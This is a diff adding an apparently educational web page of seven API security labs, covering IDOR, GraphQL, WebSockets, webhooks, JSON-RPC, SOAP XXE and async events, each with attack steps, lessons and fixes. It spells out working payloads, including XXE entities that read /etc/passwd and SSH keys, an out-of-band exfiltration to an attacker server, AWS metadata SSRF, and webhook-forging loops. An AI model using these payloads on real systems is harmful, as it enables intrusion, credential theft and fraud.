@@ -1,0 +1,443 @@
+
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:var(--font-sans);color:var(--color-text-primary);background:transparent}
+.lab-shell{display:flex;gap:0;min-height:600px;border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-lg);overflow:hidden}
+.sidebar{width:220px;flex-shrink:0;border-right:0.5px solid var(--color-border-tertiary);background:var(--color-background-secondary);padding:12px 0}
+.sidebar-header{padding:8px 16px 16px;border-bottom:0.5px solid var(--color-border-tertiary);margin-bottom:8px}
+.sidebar-header h1{font-size:13px;font-weight:500;color:var(--color-text-secondary);letter-spacing:.03em;text-transform:uppercase}
+.sidebar-header p{font-size:11px;color:var(--color-text-tertiary);margin-top:2px}
+.lab-btn{display:flex;align-items:center;gap:10px;width:100%;padding:9px 16px;border:none;background:none;cursor:pointer;text-align:left;transition:background .15s}
+.lab-btn:hover{background:var(--color-background-primary)}
+.lab-btn.active{background:var(--color-background-primary);border-right:2px solid #534AB7}
+.lab-num{width:22px;height:22px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:500;flex-shrink:0;background:var(--color-background-tertiary);color:var(--color-text-secondary)}
+.lab-btn.active .lab-num{background:#EEEDFE;color:#3C3489}
+.lab-btn.done .lab-num{background:#EAF3DE;color:#27500A}
+.lab-info{min-width:0}
+.lab-info .lname{font-size:12px;font-weight:500;color:var(--color-text-primary);line-height:1.3}
+.lab-info .ltag{font-size:10px;color:var(--color-text-tertiary)}
+.main{flex:1;min-width:0;overflow-y:auto;display:flex;flex-direction:column}
+.lab-header{padding:20px 24px 16px;border-bottom:0.5px solid var(--color-border-tertiary);background:var(--color-background-primary)}
+.lab-meta{display:flex;align-items:center;gap:8px;margin-bottom:8px}
+.badge{font-size:11px;padding:3px 10px;border-radius:20px;font-weight:500}
+.badge-rest{background:#E6F1FB;color:#0C447C}
+.badge-gql{background:#FBEAF0;color:#72243E}
+.badge-ws{background:#E1F5EE;color:#085041}
+.badge-wh{background:#FAEEDA;color:#633806}
+.badge-rpc{background:#FAECE7;color:#712B13}
+.badge-soap{background:#EAF3DE;color:#27500A}
+.badge-async{background:#EEEDFE;color:#3C3489}
+.badge-diff{font-size:11px;padding:3px 10px;border-radius:20px;font-weight:500}
+.diff-low{background:#EAF3DE;color:#3B6D11}
+.diff-med{background:#FAEEDA;color:#854F0B}
+.diff-high{background:#FCEBEB;color:#A32D2D}
+.diff-crit{background:#FBEAF0;color:#993556}
+.lab-header h2{font-size:17px;font-weight:500;margin-bottom:4px}
+.lab-header .desc{font-size:13px;color:var(--color-text-secondary);line-height:1.5}
+.lab-body{padding:20px 24px;flex:1;display:flex;flex-direction:column;gap:20px}
+.section-title{font-size:12px;font-weight:500;color:var(--color-text-tertiary);text-transform:uppercase;letter-spacing:.05em;margin-bottom:10px}
+.card{background:var(--color-background-primary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-lg);padding:16px}
+.step{display:flex;gap:12px;margin-bottom:14px}
+.step:last-child{margin-bottom:0}
+.step-num{width:24px;height:24px;border-radius:50%;background:#EEEDFE;color:#3C3489;font-size:11px;font-weight:500;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px}
+.step-body{flex:1;min-width:0}
+.step-body h4{font-size:13px;font-weight:500;margin-bottom:5px;color:var(--color-text-primary)}
+.step-body p{font-size:13px;color:var(--color-text-secondary);line-height:1.6}
+pre{background:var(--color-background-tertiary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-md);padding:12px;font-size:12px;font-family:var(--font-mono);overflow-x:auto;margin-top:8px;color:var(--color-text-primary);line-height:1.7}
+.expected{background:#EAF3DE;border:0.5px solid #C0DD97;border-radius:var(--border-radius-md);padding:12px;margin-top:8px}
+.expected p{font-size:12px;color:#27500A;line-height:1.5}
+.expected strong{font-weight:500}
+.vuln-box{background:#FCEBEB;border:0.5px solid #F7C1C1;border-radius:var(--border-radius-md);padding:12px;margin-top:8px}
+.vuln-box p{font-size:12px;color:#791F1F;line-height:1.5}
+.lesson-box{background:#E6F1FB;border:0.5px solid #B5D4F4;border-radius:var(--border-radius-md);padding:12px}
+.lesson-box p{font-size:12px;color:#0C447C;line-height:1.5}
+.lesson-box ul{padding-left:14px;margin-top:6px}
+.lesson-box li{font-size:12px;color:#0C447C;line-height:1.7}
+.fix-box{background:#E1F5EE;border:0.5px solid #9FE1CB;border-radius:var(--border-radius-md);padding:12px}
+.fix-box p{font-size:12px;color:#085041;line-height:1.5}
+.fix-box ul{padding-left:14px;margin-top:6px}
+.fix-box li{font-size:12px;color:#085041;line-height:1.7}
+.tool-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(0,1fr));gap:8px;margin-top:8px}
+.tool-pill{background:var(--color-background-secondary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-md);padding:8px 10px;text-align:center}
+.tool-pill .tname{font-size:12px;font-weight:500;color:var(--color-text-primary)}
+.tool-pill .tuse{font-size:11px;color:var(--color-text-tertiary)}
+.progress-bar{height:4px;background:var(--color-background-tertiary);border-radius:2px;overflow:hidden}
+.progress-fill{height:100%;background:#7F77DD;border-radius:2px;transition:width .4s ease}
+.nav-row{display:flex;justify-content:space-between;align-items:center;padding:14px 24px;border-top:0.5px solid var(--color-border-tertiary);background:var(--color-background-secondary)}
+.nav-btn{display:flex;align-items:center;gap:6px;padding:8px 16px;border:0.5px solid var(--color-border-secondary);border-radius:var(--border-radius-md);background:transparent;cursor:pointer;font-size:13px;font-weight:500;color:var(--color-text-primary);transition:background .15s}
+.nav-btn:hover{background:var(--color-background-primary)}
+.nav-btn:disabled{opacity:.35;cursor:default}
+.complete-btn{background:#534AB7;color:#EEEDFE;border-color:#534AB7;font-size:13px;padding:8px 16px;border-radius:var(--border-radius-md);border:none;cursor:pointer;font-weight:500}
+.complete-btn:hover{background:#3C3489}
+.progress-info{font-size:12px;color:var(--color-text-tertiary)}
+.overview-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.ov-card{background:var(--color-background-primary);border:0.5px solid var(--color-border-tertiary);border-radius:var(--border-radius-lg);padding:14px;cursor:pointer;transition:border-color .15s}
+.ov-card:hover{border-color:var(--color-border-secondary)}
+.ov-card .oc-tag{font-size:11px;font-weight:500;margin-bottom:6px}
+.ov-card h3{font-size:13px;font-weight:500;margin-bottom:3px}
+.ov-card p{font-size:12px;color:var(--color-text-secondary);line-height:1.4}
+.warn-box{background:#FAEEDA;border:0.5px solid #FAC775;border-radius:var(--border-radius-md);padding:12px}
+.warn-box p{font-size:12px;color:#633806;line-height:1.5}
+</style>
+
+<h2 class="sr-only" style="position:absolute;left:-9999px">API Security Hands-On Lab Platform — 7 interactive labs covering REST, GraphQL, WebSockets, Webhooks, RPC, SOAP, and Async APIs</h2>
+
+<div class="lab-shell">
+  <div class="sidebar">
+    <div class="sidebar-header">
+      <h1>API Security Labs</h1>
+      <p id="progress-label">0 of 7 complete</p>
+      <div class="progress-bar" style="margin-top:8px"><div class="progress-fill" id="prog-fill" style="width:0%"></div></div>
+    </div>
+    <button class="lab-btn active" onclick="show(0)" id="btn-0">
+      <span class="lab-num" id="num-0">0</span>
+      <span class="lab-info"><span class="lname">Overview</span><span class="ltag">Start here</span></span>
+    </button>
+    <button class="lab-btn" onclick="show(1)" id="btn-1">
+      <span class="lab-num" id="num-1">1</span>
+      <span class="lab-info"><span class="lname">REST — IDOR</span><span class="ltag">Auth bypass</span></span>
+    </button>
+    <button class="lab-btn" onclick="show(2)" id="btn-2">
+      <span class="lab-num" id="num-2">2</span>
+      <span class="lab-info"><span class="lname">GraphQL</span><span class="ltag">Data leakage</span></span>
+    </button>
+    <button class="lab-btn" onclick="show(3)" id="btn-3">
+      <span class="lab-num" id="num-3">3</span>
+      <span class="lab-info"><span class="lname">WebSockets</span><span class="ltag">Session abuse</span></span>
+    </button>
+    <button class="lab-btn" onclick="show(4)" id="btn-4">
+      <span class="lab-num" id="num-4">4</span>
+      <span class="lab-info"><span class="lname">Webhooks</span><span class="ltag">Spoofing</span></span>
+    </button>
+    <button class="lab-btn" onclick="show(5)" id="btn-5">
+      <span class="lab-num" id="num-5">5</span>
+      <span class="lab-info"><span class="lname">JSON-RPC</span><span class="ltag">Method abuse</span></span>
+    </button>
+    <button class="lab-btn" onclick="show(6)" id="btn-6">
+      <span class="lab-num" id="num-6">6</span>
+      <span class="lab-info"><span class="lname">SOAP — XXE</span><span class="ltag">File read</span></span>
+    </button>
+    <button class="lab-btn" onclick="show(7)" id="btn-7">
+      <span class="lab-num" id="num-7">7</span>
+      <span class="lab-info"><span class="lname">Async APIs</span><span class="ltag">Event injection</span></span>
+    </button>
+  </div>
+
+  <div class="main" id="main-content">
+  </div>
+</div>
+
+<script>
+const done = new Set();
+let current = 0;
+
+const labs = [
+  {
+    id: 0,
+    title: "Welcome to the API Security Lab",
+    type: "Overview",
+    badge: "badge-rest",
+    diff: null,
+    desc: "A self-guided, hands-on course covering real-world API attack techniques. Complete each lab in order. Read the lessons — they explain the why behind every attack.",
+    content: `overview`
+  },
+  {
+    id: 1,
+    title: "Lab 1 — Insecure Direct Object Reference (IDOR)",
+    type: "REST API",
+    badge: "badge-rest",
+    diff: "diff-low",
+    diffLabel: "Beginner",
+    desc: "The server trusts whatever user ID you send in the URL. By changing one number, you can read any user's private data.",
+    tools: [["Burp Suite","Intercept & replay"],["DevTools","Network tab"],["curl / Postman","Send raw requests"]],
+    steps: [
+      {title:"Log in and open DevTools", body:'Go to the target app, log in as a normal user, then open <strong>DevTools → Network tab</strong>. Reload your profile page.'},
+      {title:"Find the API call", body:'Look for a request like:<br><pre>GET /api/users/1\nAuthorization: Bearer &lt;your-token&gt;</pre>This is the endpoint that fetches your own profile.'},
+      {title:"Send it to Burp Repeater", body:'Right-click the request → "Send to Repeater" (or copy as curl). This lets you modify and replay it freely.'},
+      {title:"Change the user ID", body:'In Repeater, change the URL from <code>/api/users/1</code> to <code>/api/users/2</code>, then <code>/api/users/3</code>, etc. Send each one.<pre>GET /api/users/2\nAuthorization: Bearer &lt;your-token&gt;</pre>'},
+      {title:"Observe the response", body:'If the server returns another user\'s data (name, email, address) without checking that <em>you own that record</em>, the endpoint is vulnerable to IDOR.'}
+    ],
+    expected: "You receive the profile of user #2 even though you are logged in as user #1. You can enumerate ALL user records by incrementing the ID.",
+    vuln: "The server only checks if you are authenticated — not if you are authorized to access that specific resource.",
+    lesson: ["Never expose sequential numeric IDs in URLs","Use UUIDs or opaque tokens as resource identifiers","Always perform an ownership check: does this token belong to the user who owns this resource?","Return 403 Forbidden (not 404) when access is denied — 404 leaks existence"],
+    fix: ["Add an authorization layer: <code>if (resource.ownerId !== req.user.id) return 403</code>","Use non-guessable IDs (UUIDs v4)","Audit all GET/PUT/DELETE endpoints for missing ownership checks"]
+  },
+  {
+    id: 2,
+    title: "Lab 2 — GraphQL Data Overfetching & Introspection",
+    type: "GraphQL",
+    badge: "badge-gql",
+    diff: "diff-med",
+    diffLabel: "Intermediate",
+    desc: "GraphQL lets clients choose exactly what fields they want. If the server doesn't restrict sensitive fields, an attacker can request passwords, tokens, and admin data in a single query.",
+    tools: [["Burp Suite","Intercept POST /graphql"],["Insomnia","GraphQL client"],["GraphQL Voyager","Visualize schema"]],
+    steps: [
+      {title:"Find the GraphQL endpoint", body:'Watch the Network tab for a request to <code>POST /graphql</code>. GraphQL apps often have a single endpoint. Confirm with:<pre>curl -X POST /graphql -d \'{"query":"{__typename}"}\' -H "Content-Type: application/json"</pre>'},
+      {title:"Send a basic query", body:'Start with a minimal, innocent-looking query:<pre>{\n  user(id: 1) {\n    name\n  }\n}</pre>This confirms the endpoint works and the <code>user</code> query exists.'},
+      {title:"Overfetch sensitive fields", body:'Expand the query to request every field you can think of:<pre>{\n  user(id: 1) {\n    id\n    name\n    email\n    password\n    role\n    apiToken\n    resetToken\n    creditCard\n  }\n}</pre>The server should reject unknown fields — but may not.'},
+      {title:"Run an introspection query", body:'Introspection reveals the entire schema — every type, field, and query the API supports:<pre>{\n  __schema {\n    types {\n      name\n      fields {\n        name\n        type { name }\n      }\n    }\n  }\n}</pre>'},
+      {title:"Enumerate users with IDOR", body:'Combine with the IDOR technique from Lab 1 — loop over user IDs:<pre>{\n  user(id: 2) { email password role }\n}\n\n{\n  user(id: 3) { email password role }\n}</pre>'}
+    ],
+    expected: "Introspection returns the full schema. The overfetch query returns sensitive fields that should never leave the server (hashed passwords, tokens, roles).",
+    vuln: "GraphQL resolvers return all requested fields unless field-level authorization is explicitly applied. Introspection is enabled in production.",
+    lesson: ["GraphQL does not enforce field-level security by default","Introspection should be disabled in production environments","Each field resolver needs its own authorization check","Sensitive fields (passwords, tokens) should never be in the schema at all"],
+    fix: ["Disable introspection in production","Use field-level middleware: <code>@auth(requires: ADMIN)</code>","Remove sensitive fields from the schema entirely","Apply query depth and complexity limits to prevent abuse"]
+  },
+  {
+    id: 3,
+    title: "Lab 3 — WebSocket Session Abuse",
+    type: "WebSockets",
+    badge: "badge-ws",
+    diff: "diff-med",
+    diffLabel: "Intermediate",
+    desc: "WebSockets are persistent connections. Unlike HTTP, they don't re-check your auth token on every message. If the server doesn't validate the session is still valid, an attacker can keep sending messages after logging out.",
+    tools: [["DevTools → Network → WS","Watch frames"],["Burp Suite","Intercept WS messages"],["wscat","Command-line WebSocket client"]],
+    steps: [
+      {title:"Open the WebSocket connection", body:'In DevTools, go to <strong>Network → WS</strong>. Open the app\'s chat or live-data feature. You\'ll see the WebSocket connection listed. Click it to see message frames.'},
+      {title:"Observe the handshake", body:'The initial HTTP upgrade request includes your session cookie or token:<pre>GET /chat HTTP/1.1\nHost: example.com\nUpgrade: websocket\nCookie: session=abc123</pre>Auth happens here — but what about later?'},
+      {title:"Send a normal message", body:'In the Messages tab, find the format used and replicate it:<pre>{"type":"message","room":"general","content":"hello"}</pre>Confirm it arrives in the chat.'},
+      {title:"Log out of the app", body:'Log out normally using the UI. The server should invalidate your session. Now check: is the WebSocket connection still open in DevTools?'},
+      {title:"Send another message after logout", body:'Try sending the same message again through Burp or wscat:<pre>wscat -c wss://example.com/chat --header "Cookie: session=abc123"\n> {"type":"message","room":"general","content":"still here!"}</pre>If the server accepts it, the session was never revoked on the WebSocket layer.'},
+      {title:"Cross-user message injection", body:'Try sending a message impersonating another user by modifying the payload:<pre>{"type":"message","from":"admin","room":"general","content":"Click here: http://evil.com"}</pre>'}
+    ],
+    expected: "After logout, the WebSocket connection remains open and the server still processes messages, proving the session was never invalidated server-side.",
+    vuln: "The server only validates the token at connection time (HTTP handshake), not on each subsequent frame. Logout does not terminate active WebSocket connections.",
+    lesson: ["WebSockets maintain state unlike stateless HTTP requests","Session revocation must propagate to all open connections","The server cannot rely solely on the initial handshake for continued authorization","Message payloads must be sanitized — never trust client-supplied fields like 'from'"],
+    fix: ["Maintain a server-side registry of active WebSocket sessions","On logout, look up and forcibly close all connections for that session ID","Re-validate the token periodically within the WebSocket handler (e.g., every 60s)","Never trust client-supplied identity fields — derive them from the validated token"]
+  },
+  {
+    id: 4,
+    title: "Lab 4 — Webhook Spoofing",
+    type: "Webhooks",
+    badge: "badge-wh",
+    diff: "diff-high",
+    diffLabel: "Advanced",
+    desc: "Webhooks receive HTTP POST requests from external services. If the server doesn't verify the request came from the real sender, anyone can POST a fake payment event and trigger business logic.",
+    tools: [["Burp Suite / Postman","Send crafted requests"],["curl","Command-line POST"],["ngrok","Expose a local server"]],
+    steps: [
+      {title:"Identify the webhook endpoint", body:'Check the app\'s configuration, documentation, or network traffic for the endpoint:<pre>POST /webhook/payment\nPOST /webhooks/stripe\nPOST /hooks/github</pre>'},
+      {title:"Capture a real webhook (optional)", body:'If you can trigger a real event (e.g., a small test payment), capture it in Burp. Note the headers and body structure — especially any <code>X-Signature</code> header.'},
+      {title:"Send a spoofed payment success event", body:'Craft your own POST request without a valid signature:<pre>POST /webhook/payment HTTP/1.1\nContent-Type: application/json\n\n{\n  "event": "payment_success",\n  "amount": 9999,\n  "currency": "USD",\n  "user_id": "42",\n  "order_id": "ORD-001",\n  "status": "paid"\n}</pre>'},
+      {title:"Test business logic impact", body:'See what happens after the fake event is processed. Does the system:<br>• Mark an order as paid?<br>• Grant premium access?<br>• Credit a user\'s account?<br>• Trigger a shipment?'},
+      {title:"Replay attack", body:'Send the same webhook event multiple times. Without replay protection, each delivery may credit the user again:<pre>for i in 1 2 3 4 5; do\n  curl -X POST /webhook/payment -d \'{"event":"payment_success","amount":100}\'\ndone</pre>'}
+    ],
+    expected: "The server processes the forged event as if it came from the real payment provider. Business logic executes (order marked paid, access granted) without any actual payment.",
+    vuln: "The server accepts all POST requests to the webhook endpoint without verifying a cryptographic signature that proves the request originated from the real provider.",
+    lesson: ["Webhooks are just HTTP POST endpoints — anyone can send to them","Without signature verification, there is no way to tell real from fake events","Replay attacks can multiply the effect of a successful spoof","The amount and event type in the payload cannot be trusted if unauthenticated"],
+    fix: ["Verify the HMAC-SHA256 signature in X-Signature header against a shared secret","Reject requests without a valid signature immediately (return 401)","Include a timestamp in the signature and reject events older than 5 minutes (replay protection)","Use the provider's SDK which handles verification for you (e.g., stripe.webhooks.constructEvent)"]
+  },
+  {
+    id: 5,
+    title: "Lab 5 — JSON-RPC Method Abuse",
+    type: "JSON-RPC",
+    badge: "badge-rpc",
+    diff: "diff-high",
+    diffLabel: "Advanced",
+    desc: "JSON-RPC exposes server-side methods via a simple JSON interface. If the backend exposes privileged methods without checking caller permissions, any authenticated (or even unauthenticated) user can call them.",
+    tools: [["Burp Suite","Modify method names"],["curl / Postman","Send JSON payloads"],["DevTools","Find the RPC endpoint"]],
+    steps: [
+      {title:"Find the RPC endpoint", body:'Look for requests in the Network tab to endpoints like:<pre>POST /rpc\nPOST /api/rpc\nPOST /jsonrpc</pre>The request body will follow the JSON-RPC format.'},
+      {title:"Understand the normal request", body:'A standard JSON-RPC call looks like:<pre>{\n  "jsonrpc": "2.0",\n  "method": "getUser",\n  "params": [1],\n  "id": 1\n}</pre>The <code>method</code> field tells the server what function to execute.'},
+      {title:"Enumerate methods", body:'Try common privileged method names. Errors often reveal whether a method exists:<pre>{"jsonrpc":"2.0","method":"listUsers","params":[],"id":2}\n{"jsonrpc":"2.0","method":"getAdminList","params":[],"id":3}\n{"jsonrpc":"2.0","method":"getAllOrders","params":[],"id":4}</pre>'},
+      {title:"Attempt destructive methods", body:'Try calling state-changing or destructive methods:<pre>{"jsonrpc":"2.0","method":"deleteUser","params":[2],"id":5}\n{"jsonrpc":"2.0","method":"updateRole","params":[1,"admin"],"id":6}\n{"jsonrpc":"2.0","method":"resetPassword","params":["admin@app.com"],"id":7}</pre>'},
+      {title:"Check for unauthenticated access", body:'Remove your Authorization header entirely and repeat the calls. Some RPC endpoints skip auth checks when called directly, bypassing middleware.'}
+    ],
+    expected: "Privileged methods like deleteUser or updateRole execute successfully without admin privileges. The response confirms the action was taken.",
+    vuln: "The server exposes all registered methods uniformly. Authorization checks exist on the frontend (hidden buttons) but not on the backend RPC handler.",
+    lesson: ["Security by obscurity is not security — hiding the UI does not protect the API","Every RPC method must independently verify the caller's permissions","Frontend-only access control (disabling buttons) is useless if the API endpoint is reachable","Method enumeration is trivial — assume attackers will discover all method names"],
+    fix: ["Implement per-method authorization: check the caller's role before executing","Maintain an allowlist of methods accessible to each role","Log and alert on unauthorized method call attempts","Never expose destructive methods (delete, reset) to non-admin callers"]
+  },
+  {
+    id: 6,
+    title: "Lab 6 — SOAP XML External Entity (XXE)",
+    type: "SOAP API",
+    badge: "badge-soap",
+    diff: "diff-crit",
+    diffLabel: "Critical",
+    desc: "SOAP APIs process XML. If the XML parser has external entity processing enabled, an attacker can inject a special DOCTYPE that causes the server to read local files or make network requests on their behalf.",
+    tools: [["Burp Suite","Intercept & modify SOAP requests"],["curl","Send raw XML"],["xxe-rb / PayloadsAllTheThings","XXE payloads"]],
+    steps: [
+      {title:"Identify the SOAP endpoint", body:'Look for requests to endpoints like <code>/api/soap</code>, <code>/service.wsdl</code>, or <code>/ws</code>. SOAP requests use <code>Content-Type: text/xml</code> or <code>application/soap+xml</code>.'},
+      {title:"Capture a normal SOAP request", body:'A standard SOAP envelope looks like:<pre>&lt;?xml version="1.0"?&gt;\n&lt;Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/"&gt;\n  &lt;Body&gt;\n    &lt;GetUser&gt;\n      &lt;id&gt;1&lt;/id&gt;\n    &lt;/GetUser&gt;\n  &lt;/Body&gt;\n&lt;/Envelope&gt;</pre>'},
+      {title:"Inject a basic XXE payload", body:'Add a DOCTYPE declaration before the Envelope that defines an external entity:<pre>&lt;?xml version="1.0"?&gt;\n&lt;!DOCTYPE foo [\n  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;\n]&gt;\n&lt;Envelope&gt;\n  &lt;Body&gt;\n    &lt;GetUser&gt;\n      &lt;id&gt;&amp;xxe;&lt;/id&gt;\n    &lt;/GetUser&gt;\n  &lt;/Body&gt;\n&lt;/Envelope&gt;</pre>'},
+      {title:"Try other file paths", body:'If /etc/passwd works, escalate:<pre>file:///etc/shadow          (hashed passwords)\nfile:///proc/self/environ   (environment variables, may contain secrets)\nfile:///app/config.yml      (app configuration, API keys)\nfile:///home/app/.ssh/id_rsa (SSH private key)</pre>'},
+      {title:"Blind XXE (out-of-band)", body:'If the file content isn\'t reflected in the response, use a server-side request to exfiltrate data:<pre>&lt;!DOCTYPE foo [\n  &lt;!ENTITY xxe SYSTEM "http://your-server.com/?data=secret"&gt;\n]&gt;</pre>You\'ll see the request hit your server in the logs.'},
+      {title:"SSRF via XXE", body:'Use XXE to make the server call internal services:<pre>&lt;!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;</pre>This is the AWS metadata endpoint — in cloud environments this can expose IAM credentials.'}
+    ],
+    expected: "The response body contains the contents of /etc/passwd (a list of system user accounts). With further escalation, application secrets and SSH keys can be exfiltrated.",
+    vuln: "The XML parser is configured with external entity processing enabled (the default in many libraries). The application does not sanitize or validate XML input before parsing.",
+    lesson: ["XML parsers support external entities by default in many languages — this is a dangerous default","XXE can lead to arbitrary file read, SSRF, and in some cases remote code execution","The impact escalates dramatically in cloud environments (AWS metadata, GCP, Azure)","Blind XXE is harder to detect but equally dangerous"],
+    fix: ["Disable DOCTYPE declarations entirely in the XML parser configuration","In Java: factory.setFeature('http://apache.org/xml/features/disallow-doctype-decl', true)","In Python (lxml): use defusedxml library","Never use user-supplied data as part of a file path — validate and allowlist inputs","Consider switching from SOAP to REST/JSON which is immune to XXE"]
+  },
+  {
+    id: 7,
+    title: "Lab 7 — Async API Event Injection",
+    type: "Async / Event Queue",
+    badge: "badge-async",
+    diff: "diff-crit",
+    diffLabel: "Critical",
+    desc: "Async systems process events from queues (Kafka, RabbitMQ, SQS). If the consumer trusts the event payload without validating it, an attacker who can publish to the queue can escalate privileges or trigger unintended actions.",
+    tools: [["Burp Suite","Intercept the event publisher"],["curl / Postman","Publish fake events"],["kafkacat","Publish to Kafka directly"]],
+    steps: [
+      {title:"Understand the event flow", body:'Async APIs work like this:<pre>Producer → [ Message Queue ] → Consumer → Business Logic</pre>If you can publish to the queue (or to a producer API endpoint), you control what the consumer processes.'},
+      {title:"Find the event publisher endpoint", body:'Look for API calls that submit events or jobs:<pre>POST /api/events\nPOST /api/tasks\nPOST /queue/publish\nPOST /hooks/internal</pre>'},
+      {title:"Capture and understand the event schema", body:'Intercept a legitimate event. A typical structure:<pre>{\n  "event": "user_registered",\n  "user_id": 42,\n  "email": "user@test.com",\n  "role": "user",\n  "timestamp": "2025-01-01T00:00:00Z"\n}</pre>'},
+      {title:"Inject a privilege escalation event", body:'Submit a crafted event with an elevated role or system-level action:<pre>{\n  "event": "admin_created",\n  "user_id": 42,\n  "email": "attacker@test.com",\n  "role": "superadmin"\n}\n\n{\n  "event": "payment_refunded",\n  "order_id": "ORD-999",\n  "amount": 99999,\n  "user_id": 42\n}</pre>'},
+      {title:"Test for replay and flooding", body:'Send the same event hundreds of times. Without idempotency controls, each event may trigger business logic repeatedly:<pre>for i in $(seq 1 100); do\n  curl -X POST /api/events -d \'{"event":"payment_refunded","amount":50}\'\ndone</pre>'},
+      {title:"Tamper with event routing", body:'Try changing the event type to trigger different consumers:<pre>{"event":"__admin_sync__","payload":{"cmd":"flush_cache"}}\n{"event":"system.shutdown"}\n{"event":"db.migrate"}</pre>'}
+    ],
+    expected: "The consumer processes the injected event, creates an admin account, or applies a large refund. Each replayed event triggers the action again, multiplying the impact.",
+    vuln: "The event consumer trusts the event payload contents without verifying the publisher's identity or the integrity of the event. There are no idempotency controls.",
+    lesson: ["Never trust data from a queue any more than you trust HTTP request body data","Event consumers must validate every field, not just the event type","Without idempotency keys, every duplicate event triggers duplicate actions","Privilege-sensitive fields (role, permissions) should never come from an event payload — derive them from the database"],
+    fix: ["Sign events with a shared secret — consumers must verify the signature before processing","Use idempotency keys: store processed event IDs and reject duplicates","Never derive permissions from event data — look up the user's current role from the database on each event","Apply principle of least privilege to message queue access — not all services should be able to publish all event types"]
+  }
+];
+
+function overviewContent() {
+  return `
+  <div class="lab-header">
+    <div class="lab-meta">
+      <span class="badge badge-rest">Self-Guided</span>
+      <span class="badge" style="background:var(--color-background-secondary);color:var(--color-text-secondary)">7 Labs</span>
+    </div>
+    <h2>API Security Hands-On Lab</h2>
+    <p class="desc">Work through each lab independently. Each one covers a different API type and a different class of vulnerability. Read the lessons carefully — understanding the <em>why</em> matters as much as the exploit.</p>
+  </div>
+  <div class="lab-body">
+    <div>
+      <p class="section-title">Before you begin</p>
+      <div class="warn-box"><p><strong>Lab environment only.</strong> These techniques must only be used against systems you have explicit permission to test. Unauthorized testing is illegal. All labs should be performed against a local lab environment (e.g., DVWA, VulnAPI, or a VM you control).</p></div>
+    </div>
+    <div>
+      <p class="section-title">Required tools</p>
+      <div class="tool-grid">
+        <div class="tool-pill"><div class="tname">Burp Suite</div><div class="tuse">Community is free</div></div>
+        <div class="tool-pill"><div class="tname">DevTools</div><div class="tuse">Network + WS tabs</div></div>
+        <div class="tool-pill"><div class="tname">curl / Postman</div><div class="tuse">Send raw requests</div></div>
+        <div class="tool-pill"><div class="tname">wscat</div><div class="tuse">npm install -g wscat</div></div>
+      </div>
+    </div>
+    <div>
+      <p class="section-title">Lab overview — click a lab to jump in</p>
+      <div class="overview-grid">
+        ${[1,2,3,4,5,6,7].map(i => {
+          const l = labs[i];
+          const badges = ['badge-rest','badge-gql','badge-ws','badge-wh','badge-rpc','badge-soap','badge-async'];
+          const diffs = ['Beginner','Intermediate','Intermediate','Advanced','Advanced','Critical','Critical'];
+          const diffClasses = ['diff-low','diff-med','diff-med','diff-high','diff-high','diff-crit','diff-crit'];
+          const attacks = ['IDOR','Overfetching + Introspection','Session Abuse','Spoofing','Method Abuse','XXE File Read','Event Injection'];
+          return `<div class="ov-card" onclick="show(${i})">
+            <div style="display:flex;gap:6px;margin-bottom:6px">
+              <span class="badge ${badges[i-1]}" style="font-size:10px;padding:2px 8px">${l.type}</span>
+              <span class="badge ${diffClasses[i-1]}" style="font-size:10px;padding:2px 8px">${diffs[i-1]}</span>
+            </div>
+            <h3>Lab ${i}: ${attacks[i-1]}</h3>
+            <p>${l.desc.substring(0,80)}...</p>
+          </div>`;
+        }).join('')}
+      </div>
+    </div>
+    <div>
+      <p class="section-title">Completion criteria</p>
+      <div class="card">
+        <div class="step"><div class="step-num">A</div><div class="step-body"><h4>Identify</h4><p>You can look at an API and name the likely vulnerability class for its type.</p></div></div>
+        <div class="step"><div class="step-num">B</div><div class="step-body"><h4>Exploit</h4><p>You can execute the attack in a lab environment and capture the vulnerable response.</p></div></div>
+        <div class="step"><div class="step-num">C</div><div class="step-body"><h4>Fix</h4><p>You can explain the correct mitigation to a developer in plain language.</p></div></div>
+      </div>
+    </div>
+  </div>
+  <div class="nav-row">
+    <span class="progress-info">Start with Lab 1 →</span>
+    <button class="nav-btn" onclick="show(1)">Begin Lab 1 →</button>
+  </div>`;
+}
+
+function labContent(lab) {
+  const stepsHtml = lab.steps.map((s,i) => `
+    <div class="step">
+      <div class="step-num">${i+1}</div>
+      <div class="step-body">
+        <h4>${s.title}</h4>
+        <p>${s.body}</p>
+      </div>
+    </div>`).join('');
+
+  const toolsHtml = lab.tools ? `
+    <div>
+      <p class="section-title">Tools for this lab</p>
+      <div class="tool-grid">
+        ${lab.tools.map(t => `<div class="tool-pill"><div class="tname">${t[0]}</div><div class="tuse">${t[1]}</div></div>`).join('')}
+      </div>
+    </div>` : '';
+
+  const lessonHtml = `<ul>${lab.lesson.map(l => `<li>${l}</li>`).join('')}</ul>`;
+  const fixHtml = `<ul>${lab.fix.map(f => `<li>${f}</li>`).join('')}</ul>`;
+
+  const isLast = lab.id === 7;
+  const isDone = done.has(lab.id);
+
+  return `
+  <div class="lab-header">
+    <div class="lab-meta">
+      <span class="badge ${lab.badge}">${lab.type}</span>
+      <span class="badge ${lab.diff}">${lab.diffLabel}</span>
+    </div>
+    <h2>${lab.title}</h2>
+    <p class="desc">${lab.desc}</p>
+  </div>
+  <div class="lab-body">
+    ${toolsHtml}
+    <div>
+      <p class="section-title">Attack scenario — step by step</p>
+      <div class="card">${stepsHtml}</div>
+    </div>
+    <div>
+      <p class="section-title">Expected result</p>
+      <div class="expected"><p><strong>What you should see:</strong> ${lab.expected}</p></div>
+    </div>
+    <div>
+      <p class="section-title">Why is this vulnerable?</p>
+      <div class="vuln-box"><p>${lab.vuln}</p></div>
+    </div>
+    <div>
+      <p class="section-title">Security lesson</p>
+      <div class="lesson-box"><p>Key takeaways for this lab:</p>${lessonHtml}</div>
+    </div>
+    <div>
+      <p class="section-title">How to fix it</p>
